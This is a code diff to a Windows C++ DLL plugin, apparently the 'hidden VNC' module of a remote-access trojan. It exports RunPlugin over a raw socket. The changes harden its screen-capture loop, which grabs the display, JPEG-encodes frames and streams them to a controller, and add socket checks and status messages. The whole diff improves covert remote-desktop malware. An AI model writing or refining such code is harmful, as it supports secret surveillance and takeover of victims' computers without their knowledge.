@@ -134,6 +134,7 @@ static bool safe_send_vnc_frame(SOCKET sock,
 }
 
 static void send_vnc_error(SOCKET sock, const string& message) {
+    if (sock == INVALID_SOCKET) return;
     json response;
     response["action"] = "hiddenvnc_error";
     response["error"] = message;
@@ -141,6 +142,7 @@ static void send_vnc_error(SOCKET sock, const string& message) {
 }
 
 static void send_vnc_status(SOCKET sock, const string& status) {
+    if (sock == INVALID_SOCKET) return;
     json response;
     response["action"] = "hiddenvnc_status";
     response["status"] = status;
@@ -339,45 +341,40 @@ static void capture_loop() {
             break;
         }
 
-        int width = GetSystemMetrics(SM_CXSCREEN);
-        int height = GetSystemMetrics(SM_CYSCREEN);
-
-        if (width <= 0 || height <= 0) {
-            // Might happen if desktop is just created
-            Sleep(100);
-            continue;
-        }
-
-        int outWidth = max(1, (width * scale) / 100);
-        int outHeight = max(1, (height * scale) / 100);
-
-        HDC hdcScreen = GetDC(NULL);
+        HDC hdcScreen = CreateDCW(L"DISPLAY", NULL, NULL, NULL);
         if (hdcScreen) {
-            HDC hdcMem = CreateCompatibleDC(hdcScreen);
-            if (hdcMem) {
-                HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, outWidth, outHeight);
-                if (hbm) {
-                    HGDIOBJ old = SelectObject(hdcMem, hbm);
+            int width = GetDeviceCaps(hdcScreen, HORZRES);
+            int height = GetDeviceCaps(hdcScreen, VERTRES);
 
-                    SetStretchBltMode(hdcMem, HALFTONE);
-                    if (StretchBlt(hdcMem, 0, 0, outWidth, outHeight, hdcScreen, 0, 0, width, height, SRCCOPY)) {
-                        SelectObject(hdcMem, old);
+            if (width > 0 && height > 0) {
+                int outWidth = max(1, (width * scale) / 100);
+                int outHeight = max(1, (height * scale) / 100);
 
-                        vector<unsigned char> jpegBytes;
-                        string error;
-                        if (bitmap_to_jpeg(hbm, (ULONG)quality, jpegBytes, error)) {
-                            if (!safe_send_vnc_frame(sock, scale, outWidth, outHeight, jpegBytes)) {
-                                g_captureRunning.store(false);
+                HDC hdcMem = CreateCompatibleDC(hdcScreen);
+                if (hdcMem) {
+                    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, outWidth, outHeight);
+                    if (hbm) {
+                        HGDIOBJ old = SelectObject(hdcMem, hbm);
+                        SetStretchBltMode(hdcMem, COLORONCOLOR);
+
+                        if (StretchBlt(hdcMem, 0, 0, outWidth, outHeight, hdcScreen, 0, 0, width, height, SRCCOPY)) {
+                            SelectObject(hdcMem, old);
+                            vector<unsigned char> jpegBytes;
+                            string error;
+                            if (bitmap_to_jpeg(hbm, (ULONG)quality, jpegBytes, error)) {
+                                if (!safe_send_vnc_frame(sock, scale, outWidth, outHeight, jpegBytes)) {
+                                    g_captureRunning.store(false);
+                                }
                             }
+                        } else {
+                            SelectObject(hdcMem, old);
                         }
-                    } else {
-                        SelectObject(hdcMem, old);
+                        DeleteObject(hbm);
                     }
-                    DeleteObject(hbm);
+                    DeleteDC(hdcMem);
                 }
-                DeleteDC(hdcMem);
             }
-            ReleaseDC(NULL, hdcScreen);
+            DeleteDC(hdcScreen);
         }
 
         DWORD elapsed = GetTickCount() - frameStart;
@@ -433,6 +430,7 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     start_input_worker();
     json response;
     response["action"] = "hiddenvnc_initialized";
+    response["status"] = "initialized";
     safe_send_json(sock, response);
 }
 
